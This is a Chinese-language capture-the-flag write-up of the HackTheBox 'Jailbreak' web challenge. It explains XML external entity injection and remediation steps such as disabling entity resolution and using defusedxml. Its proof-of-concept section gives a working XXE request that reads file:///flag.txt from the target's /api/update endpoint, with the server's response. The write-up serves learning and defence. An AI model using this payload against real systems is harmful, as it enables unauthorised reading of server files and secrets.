## 題目 - Jailbreak
- EVENT: [CTF Try Out](https://ctf.hackthebox.com/event/1434)
- 種類: web
- 難度: very easy
- 靶機: `94.237.122.36:54349`

## 解題過程概述
觀察網站功能,注意到 `/rom` 路徑有 XML 相關資料  
開 burpsuite 發現 `/api/update` 使用 `Content-Type: application/xml` 傳資料  
於是嘗試 XXE 滲透測試


##  Initial Access - XXE (XML External Entity) 

### Vulnerability Explanation
**XXE (XML External Entity Injection)** 是一種針對 XML 解析器的攻擊手法。當應用程式處理 XML 輸入時,如果未正確配置解析器,攻擊者可以定義外部實體並引用本地或遠端資源。

**漏洞成因**:
- 後端 XML 解析器允許處理外部實體 (External Entities)
- 未禁用 DTD (Document Type Definition) 處理
- 沒有驗證或過濾使用者提供的 XML 內容

**攻擊原理**:
1. 在 XML 中定義 DTD,宣告外部實體
2. 外部實體使用 `SYSTEM` 關鍵字引用檔案系統路徑
3. 在 XML 內容中引用該實體
4. 伺服器解析 XML 時會讀取檔案內容並嵌入回應中

### Vulnerability Fix

**應用層面**:
1. **禁用外部實體處理**
   ```python
   # Python (lxml 範例)
   from lxml import etree
   parser = etree.XMLParser(resolve_entities=False, no_network=True)
   ```

2. **禁用 DTD 處理**
   ```python
   # Python (xml.etree 範例)
   import xml.etree.ElementTree as ET
   ET.XMLParser(forbid_dtd=True)
   ```

3. **使用安全的 XML 解析庫**
   - 使用 `defusedxml` 等安全加固的解析庫
   - 更新到最新版本的 XML 處理套件

4. **輸入驗證與白名單**
   - 驗證 XML 結構是否符合預期 schema
   - 拒絕包含 DOCTYPE 或 ENTITY 宣告的請求

**基礎設施層面**:
- 實施最小權限原則,限制應用程式讀取檔案的權限
- 使用 WAF (Web Application Firewall) 偵測並阻擋 XXE 攻擊模式
- 監控異常的檔案讀取行為

### POC 

取得 `file:///flag.txt`
```bash
POST /api/update HTTP/1.1
Host: 94.237.122.36:54349
Content-Length: 1409
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://94.237.122.36:54349
Referer: http://94.237.122.36:54349/rom
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
...

```
成功取得 flag
```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Thu, 30 Oct 2025 12:47:59 GMT
Content-Type: application/json
Content-Length: 130
Connection: close

{
  "message": "Firmware version HTB{b1...c} update initiated."
}

```


**Note**: 此 writeup 僅用於教育目的,請勿在未經授權的系統上進行測試。